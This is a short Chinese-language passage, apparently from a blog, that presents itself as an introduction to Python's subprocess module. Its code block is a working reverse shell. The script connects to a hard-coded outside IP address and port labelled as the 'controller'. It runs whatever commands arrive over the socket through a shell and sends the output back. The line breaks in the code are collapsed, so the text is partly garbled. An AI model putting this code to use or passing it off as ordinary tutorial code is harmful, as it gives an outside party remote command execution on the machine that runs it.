## **subprocess**

**  

  

subprocess允许生成新进程，连接到它们的输入/输出/错误管道，并获得它们的返回码(状态信息), 该模块的目的在于取代几个较旧的模块和功能，在os模块的功能subprocess也可以做到。

```
import socketimport timeimport osimport subprocess
HOST = '38.55.193.68'  # 控制端IPPORT = 53132  # 控制端端口sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 建立socksock.connect((HOST, PORT))time.sleep(2)while True:    try:        buf = sock.recv(1024)        cmd = buf.decode("utf-8")        answer = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,                                  stderr=subprocess.PIPE)        res = answer.stdout.read()        print(res)        res = str(res)        if res == "":            sock.send("OK".encode("UTF-8"))        sock.send(res.encode("UTF-8"))    except socket.timeout:        sock.close()

```
